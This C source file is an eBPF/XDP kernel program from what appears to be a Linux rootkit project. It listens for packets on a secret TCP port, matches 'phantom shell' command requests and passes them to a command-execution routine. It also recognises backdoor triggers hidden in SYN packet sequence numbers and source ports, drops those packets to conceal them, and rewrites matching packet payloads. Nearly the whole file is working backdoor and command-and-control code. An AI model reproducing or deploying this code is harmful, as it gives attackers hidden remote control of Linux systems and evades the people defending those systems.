//Linux system includes
/*#include <unistd.h>
#include <stdbool.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/ip.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/if_ether.h>
#include <linux/pkt_cls.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>*/


#include "headervmlinux.h"

//BPF & libbpf dependencies
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

//User-kernel dependencies
#include "../common/constants.h"
#include "../common/c&c.h"

//BPF exclusive includes
#include "packet/packet_manager.h"
#include "packet/protocol/tcp_helper.h"
#include "xdp/xdp_helper.h"
#include "utils/strings.h"
#include "xdp/backdoor.h"

//BPF modules to load
#include "include/bpf/sched.h"
#include "include/bpf/fs.h"
#include "include/bpf/exec.h"
#include "include/bpf/injection.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";
#define ETH_ALEN 6

//Ethernet frame struct
struct eth_hdr {
	unsigned char   h_dest[ETH_ALEN];
	unsigned char   h_source[ETH_ALEN];
	unsigned short  h_proto;
};

/**
 * @brief Checks for the packet to be a phantom request
 * Returns 1 if it wants to stop the XDP pipeline.
 * 
 * @param payload 
 * @param payload_size 
 * @param data_end 
 * @param ip 
 * @param tcp 
 * @return __always_inline 
 */
static __always_inline int check_phantom_payload(char* payload, int payload_size, void* data_end, struct iphdr* ip, struct tcphdr* tcp){
    if (tcp_payload_bound_check(payload, payload_size, data_end)){
            bpf_printk("G");
            return XDP_PASS;
        }
    bpf_printk("Detected possible phantom shell command\n");
    //Check if phantom shell command
    char phantom_request[] = CC_PROT_PHANTOM_COMMAND_REQUEST;
    int is_phantom_request = 1;
    for(int ii=0; ii<sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)-1; ii++){
        if(phantom_request[ii] != payload[ii]){
            is_phantom_request = 0;
            //bpf_printk("Not phantom: %s\n", payload);
            break;
        }
    }
    if(is_phantom_request == 1){
        execute_key_command(CC_PROT_COMMAND_PHANTOM_SHELL, ip->saddr, tcp->source, payload, payload_size);
        return 1;
    }
    bpf_printk("Not phantom shell\n");
    return 0;
}



SEC("xdp_prog")
int xdp_receive(struct xdp_md *ctx){
    //bpf_printk("BPF triggered\n");
    
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    unsigned int payload_size;
    struct ethhdr *eth = data;
    char *payload;
    struct tcphdr *tcp;
    struct iphdr *ip;
    
    //Bound checking the packet before operating with it
    //Otherwise the bpf verifier will complain
    if(ethernet_header_bound_check(eth, data_end)<0){
        bpf_printk("Bound check fail A");
        return XDP_PASS;
    }

    ip = data + sizeof(*eth);
    if (ip_header_bound_check(ip, data_end)<0){
        bpf_printk("B");
        return XDP_PASS;   
    }

    if (get_protocol(data) != IPPROTO_TCP){
        //bpf_printk("C");
        return XDP_PASS;
    }

    tcp = (void *)ip + sizeof(*ip);
    if (tcp_header_bound_check(tcp, data_end)){
        bpf_printk("D");
        return XDP_PASS;
    }

    if (get_tcp_dest_port(tcp) != SECRET_PACKET_DEST_PORT){
        bpf_printk("E %i\n", bpf_ntohs(tcp->dest));
        bpf_printk("D: %ld, DE:%ld", ctx->data, ctx->data_end);
        return XDP_PASS;
    }
    bpf_printk("Detected 9000\n");

    payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
    payload = (void *)tcp + tcp->doff*4;

    int ret_value = -1;
    //Yes, the verifier gets a bit angry when trying working with intervals in the payload
    //A chained if is also not good. A macro could be added for this kind of cases.
    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)){
        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);   
    }
    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+1){
        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
    }
    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+2){
        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
    }
    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+3){
        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
    }
    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+4){
        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
    }
    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+5){
        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
    }
    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+6){
        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
    }
    if(ret_value == 1){
        return XDP_PASS;
    }

    //Check for the rootkit backdoor trigger V1
    if(payload_size == CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE){
        if (tcp_payload_bound_check(payload, payload_size, data_end)){
            bpf_printk("G");
            return XDP_PASS;
        }
        return manage_backdoor_trigger_v1(payload, payload_size, ip->saddr, tcp->source);
    }
    //Check for rootkit backdoor trigger V3 - stream of SYN packets with hidden payload
    if(tcp->syn == 1){
        //Now, we will need to take into account that payloads might be hidden in 32-bit fields or 16-bit ones.
        //Support has been added for:
        // 3-stream 32-bit field 16 payload triggers
        // 6-stream 16-bit field 16 payload triggers

        ////32-bit 6-len streams

        //SYN packet detected, store in bpf map. 
        //When a full stream comes, then it will be analyzed and search whether it is a valid sequence
        //Known issue, ignored dliberately: IP sending packets to different ports classified as same communication
        //This way we may include some port-knocking like mechanism.
        bpf_printk("SYN detected");
        __u32 ipvalue = ip->saddr;
        struct backdoor_packet_log_data_32 *b_data_32 = (struct backdoor_packet_log_data_32*) bpf_map_lookup_elem(&backdoor_packet_log_32, &ipvalue);
        struct backdoor_packet_log_data_32 b_new_data_32 = {0};

        if (b_data_32 != NULL ){
            //Means first time this IP sends a packet to us
            //It is always between the below range, this is just to avoid verifier complains
            if(b_data_32->last_packet_modified>-1 && b_data_32->last_packet_modified<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM){
                b_new_data_32.last_packet_modified = b_data_32->last_packet_modified;
                //Necessary complicated MOD, the verifier rejects it otherwise
                b_new_data_32.last_packet_modified++;
                if(b_new_data_32.last_packet_modified>=3){
                    b_new_data_32.last_packet_modified = 0;
                }
                b_new_data_32.trigger_array[0] = b_data_32->trigger_array[0];
                b_new_data_32.trigger_array[1] = b_data_32->trigger_array[1];
                b_new_data_32.trigger_array[2] = b_data_32->trigger_array[2];
                //bpf_probe_read(&b_new_data, sizeof(struct backdoor_packet_log_data_32), b_data);
                int last_modified = b_new_data_32.last_packet_modified;
                //Yes, this is really needed to be done this way. Intervals are no sufficient
                if(last_modified != 0 && last_modified != 1 && last_modified != 2){
                    return XDP_PASS;
                }
                if(last_modified==0){
                    b_new_data_32.trigger_array[0].seq_raw = tcp->seq;
                }else if(last_modified==1){
                    b_new_data_32.trigger_array[1].seq_raw = tcp->seq;
                }else if(last_modified==2){
                    b_new_data_32.trigger_array[2].seq_raw = tcp->seq;
                }
                bpf_map_update_elem(&backdoor_packet_log_32, &ipvalue, &b_new_data_32, BPF_ANY);
                //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets 
                //where for other purpose, we must still check it)
                int ret = manage_backdoor_trigger_v3_32(b_new_data_32);
                if(ret == 1){
                    //The packet was for the backdoor, better hide it
                    return XDP_DROP;
                }
            }
        }else{
            //Done this way to avoid verifier complains
            int num = 0;
            //bpf_probe_read((void*)&(b_new_data->last_packet_modified), sizeof(__u32), (void*)&num);
            //bpf_probe_read(&(b_new_data->trigger_array[0].seq_raw), sizeof(__u32), &(tcp->seq));
            b_new_data_32.last_packet_modified = 0;
            b_new_data_32.trigger_array[0].seq_raw = tcp->seq;
            bpf_map_update_elem(&backdoor_packet_log_32, &ipvalue, &b_new_data_32, BPF_ANY);
        }

        ////16 bit 6-len streams
        struct backdoor_packet_log_data_16 *b_data_16 = (struct backdoor_packet_log_data_16*) bpf_map_lookup_elem(&backdoor_packet_log_16, &ipvalue);
        struct backdoor_packet_log_data_16 b_new_data_16 = {0};
        if (b_data_16 != NULL ){
            //Means first time this IP sends a packet to us
            //It is always between the below range, this is just to avoid verifier complains
            if(b_data_16->last_packet_modified>-1 && b_data_16->last_packet_modified<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT){
                b_new_data_16.last_packet_modified = b_data_16->last_packet_modified;
                //Necessary complicated MOD, the verifier rejects it otherwise
                b_new_data_16.last_packet_modified++;
                if(b_new_data_16.last_packet_modified>=6){
                    b_new_data_16.last_packet_modified = 0;
                }
                b_new_data_16.trigger_array[0] = b_data_16->trigger_array[0];
                b_new_data_16.trigger_array[1] = b_data_16->trigger_array[1];
                b_new_data_16.trigger_array[2] = b_data_16->trigger_array[2];
                b_new_data_16.trigger_array[3] = b_data_16->trigger_array[3];
                b_new_data_16.trigger_array[4] = b_data_16->trigger_array[4];
                b_new_data_16.trigger_array[5] = b_data_16->trigger_array[5];
                //bpf_probe_read(&b_new_data, sizeof(struct backdoor_packet_log_data_32), b_data);
                int last_modified = b_new_data_16.last_packet_modified;
                //Yes, this is really needed to be done this way. Intervals are not sufficient
                if(last_modified != 0 && last_modified != 1 && last_modified != 2 && last_modified != 3 && last_modified != 4 && last_modified != 5){
                    return XDP_PASS;
                }
                if(last_modified==0){
                    b_new_data_16.trigger_array[0].src_port = tcp->source;
                }else if(last_modified==1){
                    b_new_data_16.trigger_array[1].src_port = tcp->source;
                }else if(last_modified==2){
                    b_new_data_16.trigger_array[2].src_port = tcp->source;
                }else if(last_modified==3){
                    b_new_data_16.trigger_array[3].src_port = tcp->source;
                }else if(last_modified==4){
                    b_new_data_16.trigger_array[4].src_port = tcp->source;
                }else if(last_modified==5){
                    b_new_data_16.trigger_array[5].src_port = tcp->source;
                }
                bpf_map_update_elem(&backdoor_packet_log_16, &ipvalue, &b_new_data_16, BPF_ANY);
                //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets 
                //where for other purpose, we must still check it)
                int ret = manage_backdoor_trigger_v3_16(b_new_data_16);
                if(ret == 1){
                    return XDP_DROP;
                }
            }
        }else{
            //Done this way to avoid verifier complains
            b_new_data_16.last_packet_modified = 0;
            b_new_data_16.trigger_array[0].src_port = tcp->source;
            bpf_map_update_elem(&backdoor_packet_log_16, &ipvalue, &b_new_data_16, BPF_ANY);
        }
    }
    //Check for the packet modification PoC
    // We use "size - 1" to account for the final '\0'
    if (payload_size != sizeof(SECRET_PACKET_PAYLOAD)-1) {
        bpf_printk("F, PS:%i, P:%i, DE:%i\n", payload_size, payload, data_end);
        return XDP_PASS;
    }
    
    if (tcp_payload_bound_check(payload, payload_size, data_end)){
        bpf_printk("G");
        return XDP_PASS;
    }

    bpf_printk("Received valid TCP packet with payload %s of size %i\n", payload, payload_size);
    // Compare each byte, exit if a difference is found.
    if(str_n_compare(payload, payload_size, SECRET_PACKET_PAYLOAD, sizeof(SECRET_PACKET_PAYLOAD), payload_size)!=0){
        bpf_printk("H");
        return XDP_PASS;
    }
    int data_len_prev = data_end-data;
    int data_len_next = -1;

    bpf_printk("OLD data_end: %i, payload: %i\n", data_end, payload);
    int more_bytes = (int)(sizeof(SUBSTITUTION_NEW_PAYLOAD) - sizeof(SECRET_PACKET_PAYLOAD));
    struct expand_return ret = expand_tcp_packet_payload(ctx, eth, ip, tcp, more_bytes);
    bpf_printk("Control back to main program with retcode %i after expanding %i bytes\n", ret.code, more_bytes);
    if(ret.code == 0){
        //We must check bounds again, otherwise the verifier gets angry
        ctx = ret.ret_md;
        data = (void*)(long)ret.ret_md->data;
        data_end = (void*)(long)ret.ret_md->data_end;
        eth = ret.eth;
        if(ethernet_header_bound_check(eth, data_end)<0){
            bpf_printk("Bound check A failed while expanding\n");
            return XDP_PASS; 
        }

        ip = ret.ip;
        if (ip_header_bound_check(ip, data_end)<0){
            bpf_printk("Bound check B failed while expanding\n");
            return XDP_PASS;  
        }

        tcp = ret.tcp;
        /*if (get_protocol(data_end) != IPPROTO_TCP){
            bpf_printk("Bound check C failed while expanding\n");
            return XDP_PASS; 
        }*/

        if (tcp_header_bound_check(tcp, data_end)){
            bpf_printk("Bound check D failed while expanding\n");
            return XDP_PASS;
        }

        payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
        payload = (void *)tcp + tcp->doff*4;
        
        //Quite a trick to avoid the verifier complaining when it's clear we are OK with the payload
        //Line 6367 https://lxr.missinglinkelectronics.com/linux/kernel/bpf/verifier.c
        if(payload_size < 0|| payload_size>88888){
            bpf_printk("Unlikely you are here, but OK\n");
            return XDP_PASS;
        }
        /*if(payload_size -1 < data_end - (void*)payload ){
            return XDP_PASS;
        }*/

        //Note that sizeof(..) is returning strlen +1, but it's ok because
        //we do not want to write at payload[6]
        if((void*)payload + sizeof(SUBSTITUTION_NEW_PAYLOAD) -1 > data_end){
            bpf_printk("Bound check E failed while expanding\n");
            return XDP_PASS;
        }

        if (tcp_payload_bound_check(payload, payload_size, data_end)){
            bpf_printk("Bound check F failed while expanding\n");
            return XDP_PASS;
        }

        int pattern_size = (int)sizeof(SUBSTITUTION_NEW_PAYLOAD)-1;

        //Let's empty the payload so that the previous one does not appear 
        //even if it is larger than our new one.
        //Caution when doing this on some other place. The verifier is extremely picky on the size of this,
        //even if we know that there are empty bytes in futher positions.
        //Also if the substitution payload is smaller than the original one, then additional checks must be made
        for(int ii = 0; ii<sizeof(SUBSTITUTION_NEW_PAYLOAD) - 1; ii++){
            payload[ii] = '\0';
        }
        //Write our new payload
        modify_payload(payload, payload_size, SUBSTITUTION_NEW_PAYLOAD, pattern_size, data, data_end);

        bpf_printk("BPF finished with ret %i and payload %s of size %i\n ", ret.code, payload, payload_size);
    }else{
        bpf_printk("BPF finished with error on expansion\n");
    }
    data_len_next = data_end-data;
    bpf_printk("Previous length: %i, current length: %i\n", data_len_prev, data_len_next);
    bpf_printk("NEW data_end: %i, payload: %i\n", data_end, payload);
    bpf_printk("And on NEW CTX data_end: %i, payload: %i\n", ctx->data_end, payload);

    /*if (tcp_payload_bound_check(payload, payload_size, data_end)){
        bpf_printk("G");
        return XDP_PASS;
    }*/

    //payload[1] = 'a';
    //strncpy(payload, payload_to_write, sizeof(payload_to_write));
    //payload[5] = '\0';
    //payload[1] = 'b';
    /*if(!payload){
		bpf_probe_read_str(&rb_event->payload, sizeof(rb_event->payload), (void *)payload);
		bpf_ringbuf_submit(rb_event, 0);	
	}else{
		//Submit it to user-space for post-processing
		bpf_probe_read_str(&rb_event->payload, sizeof(rb_event->payload), (void*)0);
		bpf_ringbuf_submit(rb_event, 0);
	}*/
	
	// Same payload as secret one reeceived, pass it with modifications.
    return XDP_PASS;
}





